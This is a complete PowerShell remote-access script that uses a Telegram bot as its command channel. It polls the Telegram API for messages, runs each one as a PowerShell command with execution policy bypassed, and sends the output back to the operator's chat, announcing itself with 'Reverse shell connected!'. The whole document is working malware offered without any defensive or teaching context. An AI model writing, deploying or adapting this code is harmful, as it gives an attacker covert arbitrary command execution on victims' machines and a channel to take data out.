$botToken = "YOUR_BOT_TOKEN"
$chatID = "YOUR_CHAT_ID"
$apiURL = "https://api.telegram.org/bot$botToken"
$lastUpdateID = 0

function Send-TelegramMessage {
    param ($message)
    $message = [uri]::EscapeDataString($message)
    $url = "$apiURL/sendMessage?chat_id=$chatID&text=$message"
    try {
        Invoke-RestMethod -Uri $url -Method Get | Out-Null
    } catch {
        Write-Host "Failed to send message: $_"
    }
}

function Get-TelegramCommands {
    param ($offset)
    $url = "$apiURL/getUpdates?offset=$offset"
    try {
        $response = Invoke-RestMethod -Uri $url -Method Get
        return $response.result
    } catch {
        return @()
    }
}

Send-TelegramMessage "Reverse shell connected!"

while ($true) {
    $updates = Get-TelegramCommands -offset $lastUpdateID
    foreach ($update in $updates) {
        $lastUpdateID = $update.update_id + 1
        if ($update.message.text) {
            $command = $update.message.text
            try {
                $output = & powershell -NoProfile -ExecutionPolicy Bypass -Command $command 2>&1
                if ($output -is [System.Array]) {
                    $output = $output -join "`n"
                }
            } catch {
                $output = $_.Exception.Message
            }
            Send-TelegramMessage $output
        }
    }
    Start-Sleep -Seconds 3
}
